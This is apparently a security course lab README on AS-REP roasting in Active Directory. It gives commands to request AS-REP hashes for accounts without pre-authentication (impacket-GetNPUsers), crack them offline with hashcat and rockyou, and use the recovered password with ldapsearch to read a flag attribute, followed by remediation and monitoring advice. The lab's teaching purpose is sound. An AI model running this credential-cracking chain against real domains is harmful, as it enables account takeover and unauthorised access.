# 0x02 - AD Enumeration & Attack

## AS-REP Roasting

### Description

In Active Directory, Kerberos pre-authentication is enabled by default and
requires a user to prove their identity before the Domain Controller issues a
ticket. When an account has the DONT_REQ_PREAUTH flag set, that protection is
disabled: anyone can request an encrypted AS-REP for the account without knowing
its password. Part of that response is encrypted with a key derived from the
user's password, so the AS-REP can be captured and cracked offline with a
wordlist attack. The recovered credentials are then used to authenticate to the
DC and read an LDAP attribute (comment) not exposed through standard tooling.

### Learning Objectives

* What Kerberos pre-authentication is and why disabling it is dangerous
* How to enumerate accounts with DONT_REQ_PREAUTH set
* How to request and crack an AS-REP hash offline
* Why some LDAP attributes are only visible after authenticating
* How to remediate AS-REP roasting exposure

### Requirements

* Allowed editors: vi, vim, emacs
* All scripts tested on Kali Linux
* All files should end with a new line
* A README.md file at the root of the project folder is mandatory

## Tasks

### 0. AS-REP Roasting

1. Enumerate accounts with pre-auth disabled and request the AS-REP hash:

       impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>

2. Save the returned hash for the vulnerable user:

       echo '<krb5asrep hash>' > asrep.hash

3. Crack it offline with hashcat mode 18200 and rockyou:

       hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
       hashcat -m 18200 asrep.hash --show

4. Authenticate and read the hidden attribute (holds the flag):

       ldapsearch -x -H ldap://<DC_IP> \
         -D "<user>@<DOMAIN>" -w '<cracked_password>' \
         -b "DC=<dc>,DC=<tld>" \
         "(sAMAccountName=<user>)" comment

**Remediation**

* Enable Kerberos pre-authentication on every account.
* Enforce long, random passwords so offline cracking is infeasible.
* Monitor for AS-REQ activity without pre-auth (Event ID 4768, pre-auth type 0).

**File:** 0-flag.txt

## Author

Zia
